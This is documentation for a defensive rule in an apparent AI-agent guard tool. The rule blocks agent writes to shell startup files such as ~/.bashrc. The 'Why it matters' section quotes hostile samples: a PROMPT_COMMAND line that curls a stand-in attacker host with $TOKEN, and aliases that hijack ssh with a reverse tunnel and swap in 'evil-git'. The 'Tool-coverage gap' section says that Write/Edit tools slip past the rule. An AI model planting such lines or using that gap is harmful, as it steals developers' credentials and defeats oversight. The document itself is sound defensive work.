# `rogue.shell-rc-write`

Block writes to shell startup files (bashrc, zshrc, profile, fish config).

## What it catches

Bash redirections, `tee -a`, and `sed -i` against any of:

- `~/.bashrc`, `~/.bash_profile`, `~/.bash_aliases`
- `~/.zshrc`, `~/.zshenv`, `~/.zprofile`
- `~/.profile`
- `~/.config/fish/config.fish`
- System-wide: `/etc/bashrc`, `/etc/bash.bashrc`, `/etc/zshrc`, `/etc/profile`, `/etc/profile.d/*`

## Why it matters

Shell rc files are a triple-purpose attack surface:

1. **Persistence.** Every new shell session re-executes them. A backdoor in `~/.bashrc` survives reboots and is rarely audited (this is [MITRE ATT&CK T1546.004 — Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004/)).
2. **Credential exfiltration.** Setting `PROMPT_COMMAND='curl https://attacker?t=$TOKEN'` silently fires on every prompt — exactly the shape that the existing `exfil.curl-with-env` rule catches at runtime, but a rc-file write is the install step.
3. **Command hijack.** `alias ssh='ssh -R 6666:localhost:22'`, `alias git='evil-git'`, or `function sudo() { … }` redefines core commands. The user runs them later, never knowing.

There is **no legitimate AI coding workflow** that requires modifying a developer's shell rc files. Tool installers (nvm, rustup, pyenv) prompt the user before doing this, and every prompt is a chance for the user to refuse. An agent silently doing it is the wrong shape.

## False positives

- A repo's `setup.sh` that writes to `~/.bashrc` is caught — that's intentional. Mint a one-shot approval if you genuinely want the agent to run it.
- `cat ~/.bashrc` (read) is **not** caught.
- `grep PATH ~/.bashrc` is **not** caught.
- Writing to a project-local file *named* `.bashrc` (rare) is caught due to the path pattern. Rename the project file or fork this rule.

## Tool-coverage gap

This rule is `tool: Bash`. An agent that uses **Write** or **Edit** to modify `~/.bashrc` directly is not caught. Pair with a Write/Edit-tool path rule if needed (the path patterns are identical).

## Test it

```bash
agentlock fake-hook --session <id> --tool Bash \
  --command 'echo "export TOKEN=secret" >> ~/.bashrc'
# expect: deny

agentlock fake-hook --session <id> --tool Bash --command 'cat ~/.bashrc'
# expect: allow
```

## Sources

- [MITRE ATT&CK T1546.004 — Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004/)
